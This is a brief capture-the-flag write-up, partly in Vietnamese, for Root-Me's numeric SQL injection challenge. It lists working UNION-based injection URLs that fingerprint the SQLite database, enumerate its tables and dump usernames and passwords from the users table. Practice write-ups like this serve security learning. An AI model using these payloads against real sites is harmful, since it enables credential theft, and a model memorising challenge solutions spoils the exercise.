# SQL injection - Numeric

[![Hits](https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2FTienNHM%2Froot-me-ctf%2Ftree%2Fmaster%2FWeb-server%2FSQL%2520Injection%2FSQL%2520injection%2520-%2520Numeric&count_bg=%2379C83D&title_bg=%232D8FFF&icon=markdown.svg&icon_color=%23092753&title=Visitors&edge_flat=false)](https://hits.seeyoufarm.com)

\*\*\* Link: http://challenge01.root-me.org/web-serveur/ch18/

## Request

Retrieve the administrator password.

## Solution

Ta sẽ tấn công thông qua GET request

### Step 1: Xem loại database mà trang web đang dùng

- `http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1 order by 1,2,3,4,5,6`

- `http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1 union select 1,sqlite_version(),3`

### Step 2: Tìm tên table:

- `http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1 union select 1,tbl_name,3 from sqlite_master`

Tại đây chúng ta thấy table tên là _users_

### Step 3: Get user name and password from users table

- `https://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1 union select 1,username,password from users`
